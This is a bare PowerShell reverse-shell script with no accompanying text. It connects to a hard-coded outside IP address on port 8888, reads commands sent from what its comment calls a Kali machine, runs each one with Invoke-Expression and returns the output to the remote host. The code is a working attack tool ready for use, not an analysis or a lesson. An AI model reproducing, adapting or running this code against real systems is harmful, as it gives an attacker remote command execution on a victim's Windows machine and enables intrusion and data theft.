$IP = "172.208.104.242" 
$PORT = 8888

try {
    # Create TCP connection
    $client = New-Object System.Net.Sockets.TcpClient($IP, $PORT)
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    $writer.Write("komradz: ")
    
    while ($true) {
        # Read command from Kali
        $command = $reader.ReadLine()
        if ($command -eq "exit") { break }
        
	
        try {
            $output = (Invoke-Expression $command 2>&1 | Out-String)
            $writer.WriteLine($output)
        } catch {
            $writer.WriteLine("ERROR: $_")
        }
    }
} finally {
    # Cleanup
    $reader.Close()
    $writer.Close()
    $client.Close()
    Write-Host "Disconnected"
}